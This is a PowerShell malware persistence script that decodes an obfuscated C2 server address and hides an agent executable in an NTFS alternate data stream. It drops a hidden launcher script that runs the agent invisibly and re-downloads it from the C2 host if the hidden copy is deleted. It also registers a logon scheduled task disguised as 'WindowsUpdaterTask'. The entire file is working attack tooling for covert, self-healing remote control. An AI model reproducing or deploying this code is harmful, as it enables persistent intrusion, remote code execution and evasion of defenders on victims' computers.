param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "❌ AgentPath environment variable not set."
    exit
}

# ============================================================
# CONFIGURATION – CHANGE THIS TO YOUR C2 URL
# ============================================================
$encodedUrl = "aHR0cHM6Ly9jMi1zZXJ2ZXJ2Mi1xeHZsLm9ucmVuZGVyLmNvbQ=="
$c2BaseUrl = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedUrl))

# ============================================================
# 1. Carrier file in C:\Windows\Temp (writable by all users)
# ============================================================
$carrierFile = "C:\Windows\Temp\~DF539A.tmp"
$streamName = "thumbs.db"

# Ensure carrier file exists (create if missing)
if (-not (Test-Path $carrierFile)) {
    Set-Content -Path $carrierFile -Value "[Temp File]" -Encoding ASCII
    Write-Output "[+] Created carrier file: $carrierFile"
} else {
    Write-Output "[+] Using existing carrier file: $carrierFile"
}

# ============================================================
# 2. Hide the real agent in an Alternate Data Stream (ADS)
# ============================================================
Write-Output "[+] Hiding real agent in ADS..."
$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
Set-Content -Path $carrierFile -Stream $streamName -Value $agentBytes -Encoding Byte
$hiddenPath = "$carrierFile`:$streamName"
Write-Output "[+] Real agent hidden at: $hiddenPath"

# ============================================================
# 3. Create the extraction script (run.ps1) in C:\Windows\Temp
# ============================================================
$scriptPath = "C:\Windows\Temp\run.ps1"
$extractCode = @"
`$carrierFile = '$carrierFile'
`$streamName = '$streamName'
`$tempPath = "`$env:TEMP\agent.exe"
`$agentUrl = '$c2BaseUrl/agent.exe'

# Try to extract from carrier
if (Test-Path `$carrierFile) {
    `$bytes = Get-Content -Path `$carrierFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
    if (`$bytes) {
        [System.IO.File]::WriteAllBytes(`$tempPath, `$bytes)
        Start-Process -WindowStyle Hidden `$tempPath
        exit
    }
}

# Fallback: download fresh agent
try {
    Invoke-WebRequest -Uri `$agentUrl -OutFile `$tempPath -ErrorAction Stop
} catch {
    exit
}

# Recreate carrier file with hidden agent for next boot
if (Test-Path `$tempPath) {
    `$newBytes = [System.IO.File]::ReadAllBytes(`$tempPath)
    if (-not (Test-Path `$carrierFile)) {
        Set-Content -Path `$carrierFile -Value "[Temp File]" -Encoding ASCII
    }
    Set-Content -Path `$carrierFile -Stream `$streamName -Value `$newBytes -Encoding Byte
    Start-Process -WindowStyle Hidden `$tempPath
}
"@

Set-Content -Path $scriptPath -Value $extractCode -Encoding ASCII -Force
# Hide the script file (optional)
attrib +h $scriptPath 2>$null
Write-Output "[+] Extraction script created: $scriptPath"

# ============================================================
# 4. Create/update scheduled task via COM (no password prompt)
# ============================================================
$taskName = "WindowsUpdaterTask"

try {
    # Connect to Task Scheduler
    $taskService = New-Object -ComObject Schedule.Service
    $taskService.Connect()
    $rootFolder = $taskService.GetFolder("\")

    # Delete any existing task
    try { $rootFolder.DeleteTask($taskName, 0) } catch { }

    # Create a new task definition
    $taskDefinition = $taskService.NewTask(0)
    $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
    $taskDefinition.Principal.UserId = $env:USERNAME
    $taskDefinition.Principal.LogonType = 3   # TASK_LOGON_INTERACTIVE_TOKEN

    # Add a logon trigger
    $trigger = $taskDefinition.Triggers.Create(9)   # TASK_TRIGGER_LOGON
    $trigger.UserId = $env:USERNAME

    # Add the action: run the extraction script
    $action = $taskDefinition.Actions.Create(0)   # TASK_ACTION_EXEC
    $action.Path = "powershell.exe"
    $action.Arguments = "-WindowStyle Hidden -File `"$scriptPath`""

    # Register the task (6 = UpdateOrCreate)
    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) | Out-Null
    Write-Output "[+] Scheduled task '$taskName' created via COM. Agent will run at next logon."
} catch {
    Write-Output "[-] Failed to create scheduled task: $_"
}

# ============================================================
# 5. Done – original agent remains (you may delete it later)
# ============================================================
Write-Output ""
Write-Output "✅ PERSISTENCE COMPLETE"
Write-Output "Real agent hidden in: $hiddenPath"
Write-Output "Original agent still at: $agentPath (you may delete it after reboot)"
Write-Output "If the hidden file is ever deleted, the scheduled task will auto‑recover by downloading from C2."